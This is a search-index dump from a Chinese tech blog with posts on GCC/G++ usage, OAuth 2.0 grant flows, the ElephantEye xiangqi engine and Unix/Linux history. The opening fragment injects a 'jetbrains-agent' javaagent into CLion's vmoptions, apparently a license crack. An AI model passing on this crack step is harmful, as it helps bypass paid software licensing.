根据操作系统的位数，找到匹配的配置文件~/.CLion2019.3/config/clion.vmoptions或者~/.CLion2019.3/config/clion64.vmoptions，然后在配置文件末尾追加如下一行内容-javaagent:~/.jetbrains/jetbrains-agent-v3.0.3.ed81.605 参考资料 CLion 如何创建并运行 C/C++ 程序 Jetbrains 系列产品 2019.3.3 最新激活方法 CLion 中创建多个 .c 文件不能运行问题及报错问题 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"Linux 系统编程之二 GCC、G++ 与 GDB 的使用",url:"/posts/af282851.html",text:'GCCGCC 编译器介绍GCC（GNU Compiler Collection）编译器是 GNU 开源组织发布的 UNIX/Linux 下功能强大、性能优越的编译器，支持跨平台交叉编译，它还可以将 C、C++ 等多种语言编写的源程序编译、链接成可执行文件。而 GDB 是 GNU 推出的功能强大的程序调试器，可以说 GCC 与 GDB 是在 Linux 环境下进行 C/C++ 程序开发不可缺的工具。GCC 可以编译如 C、C++、Object-C、Java、Fortran、Pascal、Modula-3 和 Ada 等多种编程语言，而且 GCC 又是一个多平台编译器，能够在当前 CPU 平台上为多种不同体系架构的硬件平台开发软件，因此尤其适合在嵌入式软件领域的开发和编译。在使用 GCC 编译程序时，编译过程可以被细分为四个阶段：预处理、编译、汇编、链接。 GCC 使用语法介绍 语法：gcc [options] [filenames] 参数 作用 编译示例 示例说明 -o 指定输出可执行程序的名称，默认文件名为”a.out” gcc hello.c -o hello 编译单个源文件 hello.c，指定输出可执行程序的名称为 hello，支持同时编译多个源文件 -E 仅作预处理，不进行编译、汇编和链接 gcc -E hello.c -o hello.i 仅预处理源文件，指定生成中间文件 *.i，此阶段主要处理源文件中的 #ifdef、#include、#define 等预处理命令 -S 只编译到汇编语言，不进行汇编和链接，生成汇编代码 gcc -S hello.c -o hello.s 仅编译到汇编语言，指定生成汇编源文件 *.s -c 只编译、汇编到目标代码，不进行链接，生成目标文件（机器语言） gcc -c hello.s -o hello.o 根据汇编源文件 *.s，指定生成目标文件 *.o，最后根据生成的目标文件，可执行 gcc hello.o -o hello 命令生成可执行程序 -l 指定程序链接哪个静态库或者动态库 -m 表示是数学库，也就是使用 math.h 头文件 gcc hello.c -o hello -lm 编译单个源文件 hello.c，指定输出可执行程序名称为 hello，并指定程序链接到数学库 -I dir 在头文件的搜索路径列表中添加 dir 目录 -L dir 在库文件的搜索路径列表中添加 dir 目录 -O、-O2、-O3 将优化状态打开，该选项不能与”-g” 选项联合使用 -g 在生成的可执行程序中包含标准调试信息 -Wall 在发生警告时取消编译操作，即将警告看作是错误 -pedantic 严格要求代码符合 ANSI/ISO C 标准，若不符合则给出编译警告信息 -w 禁止输出所有警告 -v 打印编译器内部编译各过程的命令行信息和编译器的版本号 GCC 编译单个源文件假设有 hello.c 单个源文件，编译命令如下： gcc hello.c -o hello GCC 编译多个源文件假设有 hello.h、hello.c、main.c 三个源文件，两种编译的方式如下： 一次性编译：gcc hello.c main.c –o hello 多次独立编译（建议加上 -Wall 参数）： gcc -Wall -c main.c -o main.o gcc -Wall -c hello.c -o hello.o gcc -Wall main.o hello.o -o hello GCC 编译生成可执行文件的流程编译流程图 编译详细命令 步骤 命令 1. 预处理 gcc -E hello.c -o hello.i 2. 编译到汇编代码 gcc -S hello.c -o hello.s 3. 汇编到目标代码（机器语言） gcc -c hello.s -o hello.o 4. 链接，生成可执行文件 gcc hello.o -o hello 以上四个步骤，可以合成一个步骤，直接编译链接成可执行目标文件 gcc hello.c -o hello G++G++ 使用语法介绍 语法：g++ [options] [filenames] Make、CMake、Xmake、Automake、Autoconf、Meson 对比 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++ c语言 linux系统编程"},{title:"OAuth 2.0 特性与介绍",url:"/posts/197facd0.html",text:'前言用户认证与授权 用户认证：当用户去访问我们的系统资源的时候，我们的系统需要验证用户的身份（比如账号和密码认证这是一种方式），如果身份合法则认证通过，颁发相应的免死金牌，如果验证没通过，则提示用户请三思而后行，这就是用户认证 用户授权：用户授权一般是与用户认证相辅相成的，在认证的时候，如果认证通过，我们还会将该用户的权限信息给收集起来，并将相应信息作为依据，封装在认证的 HTTP 响应体中。当用户认证成功后，访问我们系统的某一个模块的时候，该模块是需要判断该用户是否有权访问，如果没有访问该资源的访问权限，用户也只有被拒绝访问，这就是用户授权 单点登录（SSO）单点登录一般常见于分布式应用中，用户只需要登录一次，即认证一次就可访问分布式应用中的所有模块，而不需要每访问一个模块就得去登录认证一次，这样用户嫌麻烦，后端认证逻辑也冗余。 第三方登录（授权码）比如目前互联网运用中的微信登录、微博登录、支付宝登录等，用户通过授权，第三方应用给予我们系统访问他微信相关信息的权限，我们获取后进行注册，使其称为我们系统的注册人员，实现第三方登录。 OAuth 2.0 概述OAuth 2.0 简介OAuth（Open Authorization，开放授权）是为用户资源的授权定义了一个安全、开放及简单的标准，第三方无需知道用户的账号及密码，就可获取到用户的授权信息。OAuth 2.0 是 OAuth 协议的延续版本，但不向后兼容 OAuth 1.0，即完全废止了 OAuth 1.0。值得一提的是，OAuth 2.0 规定了四种获得令牌的方式，可以选择最适合自己的那一种方式向第三方应用颁发令牌，分别包括： 简化模式（implicit） 密码模式（password） 客户端模式（client_credentials） 授权码模式（authorization_code） 特别注意：不管哪一种授权模式，第三方应用申请令牌之前，都必须先到系统备案，说明自己的身份，然后会拿到两个身份识别码：客户端 ID（client id）和客户端密钥（client secret）。这是为了防止令牌被滥用，没有备案过的第三方应用，是不会拿到令牌的。 OAuth 2.0 的角色OAuth 2.0 中有以下几个角色（以微信第三方登录为例）： 客户端：这个客户端和 OAuth 2.0 不沾亲带故，可以是任何独立的系统，比如我们自己的某个系统，或者某个 APP 客户端或者是 Web 客户端 资源拥有者：就是指我们的用户，比如微信登录中，在面对微信的数据库时，我们的系统就是无关人员；而登录的用户，在微信的系统中就是该用户信息的资源拥有者，他掌握着是否将他的微信个人信息暴露给我们的系统 认证服务器：在微信登录中，就是用来辨别用户的认证是否正确，是否可以成为该微信用户信息的资源拥有者；该系统由微信系统提供，用于鉴别资源拥有者的身份合法性 资源服务器：守护该微信用户信息的服务器，它掌握着微信的用户信息，我们的客户端最后就是向他发起请求，像面对甲方一样，求着它给我们响应该用户的微信个人信息 OAuth 2.0 实现第三方登录的流程以微信第三方登录为列子，具体的流程如下，点击查看流程图： 首先用户，登录我们的客户端，点击微信登录 我们的客户端请求微信的授权服务器，响应一个二维码给用户，用户扫码后点击同意 微信的授权服务器会对该微信用户进行验证 验证通过后，返回一个询问页面，是否授权给某某系统 用户点击确认，授权服务器就会颁发一个授权码给我们的客户端，并重定向我们的系统 此时我们的客户端获得授权码，根据授权码去微信的认证服务器申请令牌 微信的认证服务器认证通过后，会颁发一个令牌给我们的系统 当我们的系统拿到令牌时，也就是微信登录成功之时 该令牌代表着我们的系统，有权访问该微信用户在微信中的个人信息数据 我们的客户端携带令牌去微信的资源服务器获取该微信用户的个人信息 微信资源服务器校验该令牌的合法性，通过后响应该用户的微信个人信息数据给我们的客户端 OAuth2.0 四种授权方式授权码模式授权码模式（authorization_code）指的是第三方应用先申请一个授权码，然后再用该授权码来获取令牌。这种方式是最常用的流程，安全性也最高，它适用于那些有后端的 Web 应用。授权码通过前端传送，令牌则是储存在后端，而且所有与资源服务器的通信都在后端完成。这样的前后端分离，可以避免令牌泄漏。 第一步，A 网站提供一个链接，用户点击后就会跳转到 B 网站，授权用户数据给 A 网站使用。下面就是 A 网站跳转 B 网站的一个示意链接。 12345https://b.com/oauth/authorize? response_type=code&amp; client_id=CLIENT_ID&amp; redirect_uri=CALLBACK_URL&amp; scope=read 在上面的 URL 中，response_type 参数表示要求返回授权码（code），client_id 参数让 B 知道是谁在请求，redirect_uri 参数是 B 接受或拒绝请求后的跳转网址，scope 参数表示要求的授权范围（这里是只读）。 第二步，用户跳转后，B 网站会要求用户登录，然后询问是否同意给予 A 网站授权。用户表示同意，这时 B 网站就会跳回 redirect_uri 参数指定的网址。跳转时，会传回一个授权码，就像下面这样。 1https://a.com/callback?code=AUTHORIZATION_CODE 上面 URL 中，code 参数就是授权码。 第三步，A 网站拿到授权码以后，就可以在后端向 B 网站申请令牌。 123456https://b.com/oauth/token? client_id=CLIENT_ID&amp; client_secret=CLIENT_SECRET&amp; grant_type=authorization_code&amp; code=AUTHORIZATION_CODE&amp; redirect_uri=CALLBACK_URL 上面 URL 中，client_id 参数和 client_secret 参数用来让 B 确认 A 的身份（client_secret 参数是保密的，因此只能在后端发请求），grant_type 参数的值是 authorization_code，表示采用的授权方式是授权码，code 参数是上一步拿到的授权码，redirect_uri 参数是令牌颁发后的回调网址。 第四步，B 网站收到请求以后，就会颁发令牌。具体做法是向 redirect_uri 指定的网址，发送一段 JSON 数据。 12345678910{ "access_token":"ACCESS_TOKEN", "token_type":"bearer", "expires_in":2592000, "refresh_token":"REFRESH_TOKEN", "scope":"read", "uid":100101, "info":{...}} 上面 JSON 数据中，access_token 字段就是令牌，A 网站在后端拿到了。 简化模式有些 Web 应用是纯前端应用，没有后端。这时就不能用上面的方式了，必须将令牌储存在前端，因此 OAuth 2.0 允许直接向前端颁发令牌。这种方式没有授权码这个中间步骤，所以称为（授权码）” 简化模式（implicit）”，也叫” 隐藏模式”。 第一步，A 网站提供一个链接，要求用户跳转到 B 网站，并输入用户名和密码进行登录，下面的 URL 中，response_type 参数为 token，表示要求直接返回令牌。 12345https://b.com/oauth/authorize? response_type=token&amp; client_id=CLIENT_ID&amp; redirect_uri=CALLBACK_URL&amp; scope=read 第二步，用户成功登录后，通过以下 URL 跳转到 B 网站的授权页面，这里的 URL 不再需要 scope 参数。 1234https://b.com/oauth/authorize? response_type=token&amp; client_id=CLIENT_ID&amp; redirect_uri=CALLBACK_URL 第三步：用户同意授权用户数据给 A 网站使用，这时 B 网站就会跳回 redirect_uri 参数指定的跳转网址，并且把令牌作为 URL 参数传给 A 网站。 1https://a.com/callback#token=ACCESS_TOKEN 上面的 URL 中，token 参数就是令牌，A 网站因此直接在前端拿到令牌。注意，令牌的位置是 URL 锚点（fragment），而不是查询字符串（querystring），这是因为 OAuth 2.0 允许跳转网址是 HTTP 协议，因此存在” 中间人攻击” 的风险，而浏览器跳转时，锚点不会发到服务器，就减少了泄漏令牌的风险。 这种方式把令牌直接传给前端，是很不安全的。因此，只能用于一些安全要求不高的场景，并且令牌的有效期必须非常短，通常就是会话期间（session）有效，浏览器关掉，令牌就失效了。 密码模式如果用户高度信任某个应用，OAuth 2.0 也允许用户把用户名和密码，直接告诉该应用。该应用就使用用户的密码，申请令牌，这种方式称为” 密码式”（password）。 第一步，A 网站要求用户提供 B 网站的用户名和密码。拿到以后，A 就直接向 B 请求令牌。下面的 URL 中，grant_type 参数是授权方式，这里的 password 表示” 密码模式”，username 和 password 是 B 的用户名和密码。 12345https://oauth.b.com/token? grant_type=password&amp; username=USERNAME&amp; password=PASSWORD&amp; client_id=CLIENT_ID 第二步，B 网站验证身份通过后，直接给出令牌。注意，这时不需要跳转，而是把令牌放在 JSON 数据里面，作为 HTTP 回应，A 因此拿到令牌。这种方式需要用户给出自己的用户名 / 密码，显然风险很大，因此只适用于其他授权方式都无法采用的情况，而且必须是用户高度信任的应用。 客户端模式客户端模式（client_credentials）也叫凭证模式，适用于没有前端的命令行应用，即在命令行下请求令牌。 第一步，A 应用在命令行向 B 发出请求。下面的 URL 中，grant_type 参数等于 client_credentials 表示采用凭证式，client_id 和 client_secret 用来让 B 确认 A 的身份。 1234https://oauth.b.com/token? grant_type=client_credentials&amp; client_id=CLIENT_ID&amp; client_secret=CLIENT_SECRET 第二步，B 网站验证通过以后，直接返回令牌。这种方式给出的令牌，是针对第三方应用的，而不是针对用户的，即有可能多个用户共享同一个令牌。 OAuth 2.0 令牌的使用携带令牌A 网站拿到令牌以后，就可以向 B 网站的 API 请求数据了。此时，每个发到 API 的请求，都必须带有令牌。具体做法是在请求的头信息，加上一个 Authorization 字段，令牌就放在这个字段里面。下面的命令中，ACCESS_TOKEN 就是拿到的令牌。 1curl -H "Authorization: Bearer ACCESS_TOKEN" "https://api.b.com" 更新令牌令牌的有效期到了，如果让用户重新走一遍上面的流程，再申请一个新的令牌，很可能体验不好，而且也没有必要。OAuth 2.0 允许用户自动更新令牌。具体方法是，B 网站颁发令牌的时候，一次性颁发两个令牌，一个用于获取数据，另一个用于获取新的令牌（refresh_token 字段）。令牌到期前，用户使用 refresh_token 发一个请求，去更新令牌。 12345https://b.com/oauth/token? grant_type=refresh_token&amp; client_id=CLIENT_ID&amp; client_secret=CLIENT_SECRET&amp; refresh_token=REFRESH_TOKEN 上面 URL 中，grant_type 参数为 refresh_token 表示要求更新令牌，client_id 参数和 client_secret 参数用于确认身份，refresh_token 参数就是用于更新令牌的令牌。B 网站验证通过以后，就会颁发新的令牌。 OAuth 2.0 与 JWT 的关系 OAuth 2.0 是一种认证授权的协议规范 JWT 是基于 Token 的安全认证协议的实现 OAuth 2.0 的认证服务器签发的 Token 可以使用 JWT 来实现，JWT 轻量且安全。 参考博客 OAuth 2.0 的一个简单解释 OAuth 2.0 的四种授权方式 OAuth 2.0 授权模式访问之授权码模式 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"oauth"},{title:"中国象棋之二 ElephantEye 引擎深入理解",url:"/posts/df343bc0.html",text:'大纲 中国象棋之一开源 AI 引擎介绍 中国象棋之二 ElephantEye 引擎深入理解 中国象棋之三 Linux 下的象棋软件 GMChess 一、简介ElephantEye 是一款自由的中国象棋程序，在遵循《GNU 宽松通用公共许可协议》(GNU Lesser General Public Licence) 的前提下，广大象棋爱好者和程序设计师可以自由使用 ElephantEye 及其源程序。ElephantEye 中文名称为 “象眼”，它跟 “马腿” 和 “炮架子” 一起构成了中国象棋 “棋盘上的第三维”。ElephantEye 通常与一个象棋棋谱编辑软件 ElephantBoard 配合使用，寓意有板有眼 (英文 Board 的意思是 “板”)。注：现在 ElephantBoard 已更名为 “象棋巫师” 二、引擎协议ElephantEye 支持 UCCI 3.0，浅红象棋用户可通过 UCCI 引擎适配器 (UCCI2QH) 调用 ElephantEye 引擎，UCCI 命令使用帮助如下。 123456789101112131415161718支持的UCCI命令有： ucci setoption ... position {fen &lt;fen_str&gt; | startpos} [moves &lt;move_list&gt;] banmoves &lt;move_list&gt; go [ponder | draw] ... ponderhit [draw] | stop probe {fen &lt;fen_str&gt; | startpos} [moves &lt;move_list&gt;] quit可以返回的UCCI信息有： id {name &lt;engine_name&gt; | version &lt;version_name&gt; | copyright &lt;copyright_info&gt; | author &lt;author_name&gt; | user &lt;user_name&gt;} option ... ucciok info ... pophash [bestmove &lt;best_move&gt;] [lowerbound &lt;value&gt; depth &lt;depth&gt;] [upperbound &lt;value&gt; depth &lt;depth&gt;] {nobestmove | bestmove &lt;best_move&gt; [ponder &lt;ponder_move&gt;] [draw | resign]} bye 三、参数设置ElephantEye 作为 UCCI 引擎，有若干可以设置的参数 (可以直接在 &lt; 象棋巫师&gt; 中设置)：(1) 开局库： 默认的开局库为 ElephantEye 程序 (ELEEYE.EXE) 所在目录下的 BOOK.DAT，含有 10,000 个对称局面的着法。(2) 思考时间： 限定思考深度通常不是很好的选择，建议给定限时让程序自动分配时间。而在解杀局或分析局面时，则可让程序无限制思考，并可随时中止思考。(3) 置换表大小： 尽管置换表大小对程序的运行速度影响不大，默认 16MB 的设置已经足够，但 ElephantEye 还是提供了设置置换表大小的功能。在内存允许的情况下，下慢棋时可以适当增加置换表的大小，但建议不要超过物理内存的一半。(3) 裁剪程度： 为加快程序的运算速度，ElephantEye 默认使用空着裁剪，并且产生负面影响的可能性很小。只有最低级别会禁用空着裁剪。(4) 知识量： 知识量和局面评价的准确性有关，在 ElephantEye 的知识量等级中，只有最低级别是不采用局面评价函数的 (只考虑子力价值)，在解排局等不需要依靠审局知识来分析的局面时，可以尝试用这种设置。(5) 随机性： ElephantEye 设有 4 级随机性。随机性越大，程序越有可能走出它认为不是最好的着法，但 “不是最好的着法” 并非一点好处也没有，尤其在没有启用开局库时，适当增大随机性，可以避免程序在相同的局面下走出一样的着法。 四、规则从 2.0 版开始，ElephantEye 除了支持 “单方面长将判负” 的规则外，还支持 “长打判负”，“打” 包括 “将” 和 “捉”。尽管 ElephantEye 在复杂的情况可能无法正确识别长打，但由于支持 UCCI 命令 banmoves … ，一旦用户认为引擎走了 “长打” 的禁着，可以用 &lt; 象棋巫师 &gt; 的 “设置禁着” 功能让引擎强制变着。由于程序复杂性方面的限制，只有以下三种情况被识别成 “捉”，分别是： A. 马捉车或有根的炮兵 (卒)；B. 车捉有根的马炮兵 (卒)；C. 炮捉车或有根的马兵 (卒)。 五、博弈算法ElephantEye 属于偏向蛮力的象棋程序，使用了严谨而有效的博弈算法：(1) 使用位行和位列的着法生成器： 位行 (BitRanks) 和位列 (BitFiles) 有利于滑动棋子 (车和炮) 的着法 (尤其是吃子着法) 生成，位行和位列可以用查表来代替在射线上做的循环运算。在 ElephantEye 中，位行和位列的技术不仅用在着法生成器中，也用到了牵制的判断上。(2) 静态局面搜索： 在做静态搜索时，ElephantEye 搜索了吃子或解将的着法，在搜索吃子着法时，ElephantEye 过滤掉不重要的吃子，例如吃不过河的兵、吃不处于防守中的士象等着法，都不在静态搜索的范围之内。(3) 循环着法和长将检测： ElephantEye 可以识别循环着法，出现循环着法时可以判断哪方为长将，并且会利用禁止长将的规则来谋求优势，但目前 ElephantEye 还无法识别长捉。(4) 置换表： ElephantEye 参考了中国象棋程序 “纵马奔流” 的设计思路，使用深度优先和始终覆盖的双层置换表，并采用低出 (高出) 边界修正的置换表更新策略。(5) 带检验的空着裁剪： ElephantEye 使用 R=2 的空着裁剪，在残局阶段使用带检验的空着裁剪。(6) 迭代加深 / 吃子着法 / 杀手着法 / 历史表启发： ElephantEye 的着法排序非常简单清晰，依次是迭代加深着法、好的吃子着法、杀手着法和按历史表排序的生成着法。(7) 将军 / 唯一应将 / 兑子延伸： 在选择性延伸上，ElephantEye 采用了将军、唯一应将和兑子延伸。(8) Alpha-Beta 主要变例搜索： ElephantEye 使用传统意义上的递归式 Alpha-Beta 主要变例搜索。(9) 开局库： ElephantEye 的开局库共包含了 10,000 个对称着法，是从 1990 年到 2005 年全国象棋个人赛、团体赛、五羊杯、联赛等 8,000 局顶尖比赛中提取的。(10) 后台思考和时间分配策略： ElephantEye 支持后台思考功能，同时提供了时段制和加时制两种时间分配策略，会自动合理分配时间。 六、开局库ElephantEye 的开局库可由 “ElephantEye 开局库制作工具” 制作。运行制作工具后，首先要选择 PGN 棋谱所在的文件夹，然后保存为开局库文件 (通常是 BOOK.DAT)。通常，用来生成开局库的棋谱数量越多，生成的开局库文件就越大。为了使制作的开局库对 ElephantEye 生效，只需要把生成的开局库文件替换掉 ElephantEye 目录下的 BOOK.DAT 即可，也可以在 &lt; 象棋巫师 &gt; 的 “引擎设置” 对话框中指定开局库文件。 七、局面评价函数库ElephantEye 从 2.1 版开始，程序的搜索部分和局面评价部分就分离了，搜索部分通过调用 API 函数的形式与局面评价部分耦合。其他象棋程序设计师可以在 ElephantEye 的基础上更自由地发挥。根据 LGPL 协议，搜索和局面评价这两个部分都作为独立的程序库，运用其中任何一部分都只需要公开该部分的源程序即可。换句话说，如果局面评价部分没有使用任何开放代码，那么程序设计师就没有义务公开这部分的源程序，搜索部分也是如此。ElephantEye 的局面评价 API 函数接口定义如下： 12345A. 局面评价引擎名称：const char *GetEngineName(void);B. 局面预评价函数接口：void PreEvaluate( PositionStruct *lppos, PreEvalStruct *lpPreEval);C. 局面评价函数接口：int Evaluate(const PositionStruct *lppos, int vlAlpha, int vlBeta);其中 PositionStruct 和 PreEvalStruct 必须分别符合 position.h 和 pregen.h 中定义的结构。 八、源代码ElephantEye 的源代码包括 9 个模块，内容大致为：(1) ucci.h/ucci.cpp UCCI 命令解释模块，包括 Windows 和 Unix 下的行输入接收程序；(2) pregen.h/pregen.cpp Zobrist 数组和着法预置表的生成模块。ElephantEye 的预置表分两个部分，一是滑动棋子的着法预置表 (包括不吃子、车吃子、炮吃子和隔两子吃子)，它是实现位行和位列技术的基础；二是其他棋子的着法预置表，使得着法生成时避免了烦琐的边界判断。(3) position.h/position.cpp 主要描述着法和局面的数据结构及功能。局面的处理是本模块的重点，处理内容包括局面初始化、FEN 串导入、棋子移动、杀手着法的合理性判断、将军判断、长将和循环检测、子力价值分调整等过程，还包括 5 个子力位置价值表。(4) genmoves.cpp 着法生成器，包括生成吃子着法和生成不吃子着法的两个，但不能只生成解除将军的着法。在生成吃子着法的同时赋予每个着法以相应的 MVV (LVA)(或称准 SEE) 值。该模块还有一个专门判断棋子是否有保护的函数，来计算 MVV (LVA) 值，对于有保护的棋子，计算 MVV-LVA 的值 (小于零不计)，对于无保护的棋子，只计算 MVV 的值。因此，判断棋子是否有根的程序也包括在本模块中。(5) hash.h/hash.cpp 置换表、历史表和着法列表管理模块，包括置换表的分配和存取、主要变例获取等操作。(6) book.h/book.cpp 开局库读取模块。(7) movesort.h/movesort.cpp 着法列表排序模块。(8) search.h/search.cpp 搜索模块，除了静态搜索、完全搜索和根结点搜索这三个主要过程外，还包括迭代加深控制、后台思考、时间分配、搜索参数统计和搜索信息输出等内容。该模块是整个程序的核心模块。(9) eleeye.cpp 主程序 (即 main 函数)。(10) preeval.cpp 子力位置数组预生成器，ElephantEye 根据 “进攻 / 防守” 和 “开局 / 中局 / 残局” 两个参数线性调整子力位置数组。(11) evaluate.cpp 局面评价函数，ElephantEye 采用了四级偷懒评价的机制，最粗的层次只评价特殊棋型，进一层次评价牵制，再进一层次评价车的灵活性，最高层次还评价马的阻碍。 九、引擎表现ElephantEye 的设计重点在搜索算法，但在知识上比较欠缺。在 2.8 GHz 的处理器上每秒可搜索约 1,000,000 个结点 (包括常规搜索和静态搜索)，一般的中局局面在 1 分钟内可搜索约 11 层。在棋力上，ElephantEye 和 “棋隐”、SaoLa (象棋挑战者) 等程序具有同等水平，但由于局面评估函数上的缺陷，ElephantEye 距离顶尖的商业象棋软件 (谢谢大师、象棋世家、象棋奇兵、棋天大圣等) 尚有一定的差距。ElephantEye 在联众、弈天等象棋对弈网站上作过测试，用等级分来衡量，联众网的战绩在 2500 分左右，弈天网快棋的战绩在 2000 分左右，慢棋在 1500 分左右。2005 年 9 月在台湾象棋软件爱好者施金山的帮助下，ElephantEye 参加了在台北举行的第 10 届 ICGA 电脑奥林匹克大赛中国象棋组比赛，战绩是 7 胜 5 和 14 负，在 14 个程序中排名第 11；2006 年 8 月 ElephantEye 参加了在北京举行的全国首届计算机博弈锦标赛，战绩是 7 胜 2 和 11 负，在 18 个程序中排名第 7。 十、附加模块ElephantEye 的源代码包除了 ElephantEye 本身的源代码外，还包括以下几个附加模块：(1) 基础代码 (base)：提供了汇编指令、系统函数调用等功能；(2) 中国象棋规则模块 (cchess)：为其他软件使用 ElephantEye 代码提供了接口；(3) 开局库制作模块 (BOOK)：制作开局库 BOOK.DAT 的代码；(4) UCCI 引擎联赛模拟器 (LEAGUE)：为 UCCI 引擎测试和比赛提供了自动批量对局的平台；(5) UCCI 引擎搜索树分析器 (TREE)：UCCI 引擎 (支持 UCCI 2.2+) 的搜索路线分析工具；(6) XQF 棋谱工具 (XQFTOOLS)：提供 XQF 等多种棋谱转换为 PGN 的工具；(7) 浅红象棋适配器 (UCCI2QH)：为浅红象棋调用 UCCI 引擎提供了接口；(8) 浅红象棋引擎支持 UCCI 的适配器 (QH2UCCI)：为 “梦入神蛋” 浅红象棋加入 UCCI 引擎测试提供了接口；(9) BBS Chess (BBSCHESS)：一个用 Visual Basic 制作的国际象棋局面设置工具，可在各高校 BBS 上粘贴彩色的国际象棋局面；(10) 棋盘图片生成器 (FEN2BMP)：一个可以把国际象棋和中国象棋的 FEN 文件转换成 BMP 文件的实用工具；(11) 编码转换 (codec)，包括简繁转码、UNIX 文本转码、Base64 转码等；(12) 其他工具 (MISC)：包括简易网络通讯、管道测试等工具；(13) 说明文档 (DOC)：即《中国象棋程序设计探索》系列连载；(14) 参赛棋谱 (CCGC)：ElephantEye 参加首届全国计算机博弈锦标赛 (CCGC) 的全部棋谱。 十一、资源下载 象棋巫师 (v4.84) 完整版的代码 象棋巫师轻量版的 Github 代码 ElephantEye (v3.15) 引擎的 Github 代码 十二、参考资料 象棋百科全书 中国象棋对弈程序 ElephantEye (象眼) var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ai"},{title:"Linux 系统编程之一 Unix、Linux 操作系统介绍",url:"/posts/429c103b.html",text:'操作系统的作用 方便：使计算机系统易于使用 有效：以更有效的方式使用计算机系统资源 扩展：方便用户有效开发、测试和引进新功能 操作系统的地位操作系统在计算机系统中承上启下的地位：向下封装硬件，向上提供操作接口。 Unix/Linux 介绍Unix 家族史 1965：贝尔实验室（Bell Labs）加入一项由通用电气和麻省理工学院合作的计划，该计划要建立一套多使用者、多任务、多层次的 MULTICS 操作系统，后来因为项目太为复杂失败 1969：其主要开发者 Thompson（后被称为 Unix 之父）和 Ritchie 领导一组开发者，开发了一个新的多任务操作系统 — UNICS，后来被改名为 Unix，最初的 Unix 是用 B 语言和汇编语言混合编写而成 1971：两人在贝尔实验室共同发明了 C 语言，并于 1973 用 C 语言重写了 Unix 1974：Unix 第一次出现在贝尔实验室以外。此后 Unix 被政府机关，研究机构，企业和大学注意到，并逐渐流行开来 1980：有两个最主要的 Unix 的版本线，一个是 Berkeley 的 BSD Unix，另一个是 AT&amp;T 的 Unix，两者的竞争最终引发了 Unix 的战争，最终导致 Unix 出现各种各样的变种版本 1982：AT&amp;T 基于版本 7 开发了 Unix System Ⅲ 的第一个商业版本，并不再开源 1992~2001：由于版权问题，AT&amp;T 公司与 BSD 开发组开始了一场将近 10 年的版权官司。Unix 由于其昂贵的费用，仅局限于大型机的应用；BSD 因为版权问题，失去了宝贵的发展时期 Linux 家族史 Minix（mini-Unix）最初是由 Andrew Tanenbaum 教授，仿照 4.3 BSD 的源代码，白手起家完成了 12000 行 C 语言的编写工作，这个系统只是一个教学工具，没有什么实际应用价值 1990 年，Linus Torvalds 决定编写一个自己的 Minix 内核，初名为 Linus\' Minix，意为 Linus 的 Minix 内核，后来改名为 Linux，此内核于 1991 年正式发布，并逐渐引起人们的注意 Linux 操作系统的诞生、发展、和成长过程依赖于五个重要支柱：Unix 操作系统、Minix 操作系统、GNU 计划、POSIX 标准和互联网 GNU 计划：GNU 是 GNU is Not Unix 的递归缩写，由 Richard M.Stallman 于 1984 年创办，旨在开发一个免费、类 Unix 的操作系统 。GNU 系统及其开发工具包括：Emacs 编辑系统、BASH Shell 程序、GCC、GDB 等，这些开发工具都是 GNU 组织的产品 1992 年 Linux 与其他 GNU 软件结合，完全自由的操作系统正式诞生。该操作系统往往被称为 GNU/Linux 或简称 Linux POSIX 标准：POSIX 标准定义了操作系统应该为应用程序提供的接口标准，POSIX 标准用来统一 Unix、Linux 各分支编程接口，以提高其通用型和可移植性 Linux 的远亲 Linux 的两类用户 Linux 和 Unix 的联系 Unix 系统是工作站上最常用的操作系统，它是一个多用户、多任务的实时操作系统，允许多人同时访问计算机，并同时运行多个任务。Unix 系统具有稳定、高效、安全、方便、功能强大等诸多优点，自 20 世纪 70 年代开始便运行在许多大型和小型计算机上 Unix 